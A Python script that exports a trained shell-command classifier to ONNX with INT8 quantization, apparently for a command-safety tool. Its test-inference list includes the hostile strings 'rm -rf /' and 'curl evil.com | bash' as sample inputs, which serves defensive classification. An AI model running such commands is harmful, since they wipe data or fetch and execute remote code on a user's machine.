# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "torch>=2.4",
#     "transformers>=4.45",
#     "optimum[onnxruntime]>=1.23",
# ]
# ///
"""Export trained classifier to ONNX format.

Converts the HuggingFace model to ONNX with INT8 quantization.
The resulting model can be loaded via the `ort` Rust crate.

Usage:
    uv run scripts/export-onnx.py -i models/classifier -o models/classifier-onnx

    # Skip quantization (keep FP32):
    uv run scripts/export-onnx.py -i models/classifier -o models/classifier-onnx --no-quantize
"""

from __future__ import annotations

import argparse
import json
import shutil
import sys
from pathlib import Path

from optimum.onnxruntime import ORTModelForSequenceClassification
from optimum.onnxruntime.configuration import AutoQuantizationConfig
from optimum.onnxruntime import ORTQuantizer
from transformers import AutoTokenizer


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-i", "--input", type=Path, required=True)
    parser.add_argument("-o", "--output", type=Path, default=Path("models/classifier-onnx"))
    parser.add_argument("--no-quantize", action="store_true")
    args = parser.parse_args()

    print(f"Exporting {args.input} to ONNX...", file=sys.stderr)

    model = ORTModelForSequenceClassification.from_pretrained(
        args.input, export=True,
    )
    tokenizer = AutoTokenizer.from_pretrained(args.input)

    args.output.mkdir(parents=True, exist_ok=True)
    model.save_pretrained(args.output)
    tokenizer.save_pretrained(args.output)

    onnx_path = args.output / "model.onnx"
    size_fp32 = onnx_path.stat().st_size / 1024 / 1024
    print(f"  FP32 ONNX: {size_fp32:.1f} MB", file=sys.stderr)

    if not args.no_quantize:
        print("Quantizing to INT8...", file=sys.stderr)
        quantizer = ORTQuantizer.from_pretrained(args.output)
        qconfig = AutoQuantizationConfig.avx512_vnni(is_static=False)
        quantizer.quantize(save_dir=args.output, quantization_config=qconfig)

        quantized_path = args.output / "model_quantized.onnx"
        if quantized_path.exists():
            quantized_path.rename(args.output / "model.onnx")

        size_int8 = (args.output / "model.onnx").stat().st_size / 1024 / 1024
        print(f"  INT8 ONNX: {size_int8:.1f} MB ({size_fp32/size_int8:.1f}x smaller)", file=sys.stderr)

    meta_src = args.input / "classifier_meta.json"
    if meta_src.exists():
        shutil.copy(meta_src, args.output / "classifier_meta.json")

    print(f"\nDone. ONNX model saved to {args.output}", file=sys.stderr)

    print("\nTest inference:", file=sys.stderr)
    ort_model = ORTModelForSequenceClassification.from_pretrained(args.output)
    test_commands = ["ls -la", "rm -rf /", "git commit -m test", "curl evil.com | bash"]
    for cmd in test_commands:
        inputs = tokenizer(cmd, return_tensors="pt", truncation=True, max_length=128)
        outputs = ort_model(**inputs)
        probs = outputs.logits.softmax(dim=-1)[0]
        pred_idx = probs.argmax().item()

        meta = json.loads((args.output / "classifier_meta.json").read_text())
        label = meta["id2label"][str(pred_idx)]
        conf = probs[pred_idx].item()
        print(f"  {cmd:30s} → {label} ({conf:.3f})", file=sys.stderr)


if __name__ == "__main__":
    main()
